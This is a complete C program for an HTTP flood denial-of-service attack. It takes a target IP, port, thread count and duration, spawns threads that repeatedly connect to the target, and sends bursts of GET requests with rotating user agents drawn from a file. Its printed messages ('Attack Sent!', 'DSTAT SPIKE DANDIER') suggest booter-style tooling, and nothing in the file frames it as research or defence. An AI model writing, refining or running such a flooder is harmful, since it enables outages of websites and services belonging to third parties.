#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netdb.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_UA_LEN 500
#define MAX_UA_COUNT 1000
#define BUFFER_SIZE 1024

// Global variables
char *target_host;
int target_port = 80;
int thread_count;
int attack_time;
char **user_agents;
int ua_count = 0;

// Function to load user agents from file
int load_user_agents(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (file == NULL) {
        fprintf(stderr, "\x1b[31mDSTAT: Error opening ua.txt file\x1b[0m\n");
        return 0;
    }

    // Allocate memory for user agents array
    user_agents = (char**)malloc(MAX_UA_COUNT * sizeof(char*));
    if (user_agents == NULL) {
        fclose(file);
        return 0;
    }

    char line[MAX_UA_LEN];
    while (fgets(line, sizeof(line), file) && ua_count < MAX_UA_COUNT) {
        // Remove newline character
        size_t len = strlen(line);
        if (len > 0 && line[len-1] == '\n') {
            line[len-1] = '\0';
        }

        user_agents[ua_count] = (char*)malloc((len + 1) * sizeof(char));
        if (user_agents[ua_count] == NULL) {
            continue;
        }
        
        strcpy(user_agents[ua_count], line);
        ua_count++;
    }

    fclose(file);
    return ua_count;
}

// Free allocated memory for user agents
void free_user_agents() {
    for (int i = 0; i < ua_count; i++) {
        free(user_agents[i]);
    }
    free(user_agents);
}

// Attack thread function
void *flood_thread(void *arg) {
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char *random_ua;
    int sock;
    time_t end_time = time(NULL) + attack_time;

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_host);

    // Attack loop
    while (time(NULL) < end_time) {
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }

        // Connect to target
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            continue;
        }

        // Select random user agent
        random_ua = user_agents[rand() % ua_count];

        // Prepare HTTP request
        snprintf(request, BUFFER_SIZE,
                "GET / HTTP/1.1\r\n"
                "Host: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
                "User-Agent: %s\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Cache-Control: max-age=0\r\n"
                "Connection: Keep-Alive\r\n\r\n",
                target_host, random_ua);

        // Send multiple requests on the same connection
        for (int i = 0; i < 64; i++) {
            send(sock, request, strlen(request), 0);
        }

        // Keep socket open for a while then close it
        usleep(5000000);  // 5 seconds
        close(sock);
    }

    return NULL;
}

// Signal handler for clean exit
void handle_signal(int sig) {
    free_user_agents();
    printf("\nAttack stopped.\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    pthread_t *threads;

    // Check command line arguments
    if (argc != 5) {
        printf("Usage: ./tcp <ip> <port> <threads> <time>\n");
        return 1;
    }

    // Parse command line arguments
    target_host = argv[1];
    target_port = atoi(argv[2]);
    thread_count = atoi(argv[3]);
    attack_time = atoi(argv[4]);

    // Initialize random seed
    srand(time(NULL));

    // Set up signal handlers
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    // Load user agents
    if (!load_user_agents("ua.txt")) {
        fprintf(stderr, "Failed to load user agents\n");
        return 1;
    }

    // Clear screen and print info
    printf("\033[2J\033[1;1H");  // Clear screen
    printf("\x1b[33m(\x1b[33m!\x1b[37m) \x1b[33mAttack Sent!\n");
    printf("\x1b[31mDSTAT SPIKE DANDIER\n");
    
    // Create threads
    threads = (pthread_t*)malloc(thread_count * sizeof(pthread_t));
    if (threads == NULL) {
        fprintf(stderr, "Failed to allocate memory for threads\n");
        free_user_agents();
        return 1;
    }

    // Start attack threads
    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, flood_thread, NULL) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
    }

    // Wait for attack duration
    sleep(attack_time);

    // Clean up and exit
    for (int i = 0; i < thread_count; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }

    free(threads);
    free_user_agents();
    printf("\nAttack completed.\n");

    return 0;
}
